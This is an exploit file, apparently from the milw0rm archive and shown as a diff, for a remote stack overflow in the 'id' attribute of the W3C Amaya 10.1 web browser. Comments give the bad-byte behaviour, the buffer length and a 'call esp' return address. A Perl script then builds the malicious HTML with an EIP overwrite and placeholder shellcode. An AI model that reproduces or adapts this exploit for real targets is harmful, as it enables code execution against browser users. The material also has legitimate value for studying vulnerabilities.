@@ -1,0 +1,51 @@
+#            W3C Amaya 10.1 Web Browser
+#
+# Amaya (id) Remote Stack Overflow Vulnerability
+#
+# Written and discovered by: 
+# r0ut3r (writ3r [at] gmail.com / www.bmgsec.com.au)
+#
+# Advisory: http://www.bmgsec.com.au/advisory/41/
+# ------------------------------------------------------
+#
+# Shellcode notes: 
+# The application fails to correctly process certain bytes: 
+# 0x9c becomes 0x9cc2
+# Similar events occur with different bytes (0xf8, 0xfb, 0xbe, 0x93, 0xab, 0xaf 0xeb). 
+#
+# After reviewing the source code, the below function modifies the
+# shellcode:  
+# Line 902: int TtaWCToMBstring (wchar_t src, unsigned char **dest)
+#
+# The max value which can be used is 0x1fffff <-- Thanks Luigi!
+# ------------------------------------------------------
+#
+# The "id" variable of a tag contains a buffer overflow: 
+# <div id=" 93*'A/' ">r0ut3r</div>
+#
+# The application will not overflow with normal alphanumeric characters. 
+# To fill the buffer I had to use "A/" repeated 91 times. Therefore buffer length is: 
+# 91 * 2 = 182 + 4
+#
+# [junk] + [eip] +     [shellcode]
+#  182   +   4   +  sizeof(shellcode)
+#
+# ESP points to data after EIP. 
+#
+# "id" variable Proof of concept: 
+#!/usr/bin/perl
+
+use warnings;
+use strict;
+
+my $shellcode = 'C' x 350;
+
+# 0x7D035F53 -> \x53\x5f\x03\x7d <-- Bingo! (call esp)
+my $data   =       '<div id="' .
+                        'A/' x 91 .
+                        "\x53\x5f\x03\x7d" . # eip (ESP points to stuff after RET, so shellcode)
+                        $shellcode . 
+                        '">test</div>';
+print $data;
+
+# milw0rm.com [2008-11-24]
